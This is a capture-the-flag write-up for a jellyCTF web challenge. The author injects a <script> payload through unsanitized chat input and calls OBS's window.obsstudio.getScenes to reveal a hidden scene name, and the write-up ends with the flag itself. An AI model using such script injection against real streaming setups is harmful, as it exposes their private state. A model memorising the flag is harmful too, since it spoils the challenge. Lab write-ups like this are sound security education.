# pentest_on_stream
Writeup author: **taodragon_**

Point count: 766pts

Difficulty: medium

Provided files: pentest_on_stream.zip

Description: 
> does this alien princess even sanitize her inputs? see if you can figure out what's going on **behind the scenes**
#

Looking at `app/obs_worker.py`, the program visits a webpage locally and takes a screenshot. From `app/server.py`, we see that user input is not sanitized, and with some testing, we see that we can use `<script>` tags.

In `/obs-studio/basic/scenes/scenes.json` we find the following lines:
```
{
    "current_scene": "chat",
    "current_program_scene": "chat",
    "scene_order": [
        {
            "name": "chat"
        },
        {
            "name": "jellyCTF{redacted}"
        }
    ],
...
    "sources": [
        {
            "prev_ver": 503382018,
            "name": "Browser",
            "uuid": "4f234afd-e963-47e3-98b2-d754742c6707",
            "id": "browser_source",
            "versioned_id": "browser_source",
            "settings": {
                "is_local_file": true,
                "local_file": "/app/chat.html",
...
```
The flag is the name of a scene in OBS. We also see that the screenshot is taken with a browser source. We can read [the documentation of obs_browser](https://github.com/obsproject/obs-browser?tab=readme-ov-file#get-scenes) to find the javascript function `window.obsstudio.getScenes`, which returns the scenes. We can use this to get the flag.

Payload: 
```
<span id="pbchocolate">placeholder</span><script>window.obsstudio.getScenes(function (scenes) {document.getElementById('pbchocolate').innerHTML = scenes[1]})</script>
```
Flag: `jellyCTF{y0u_CANT_ju5t_d0_that_dud3}`
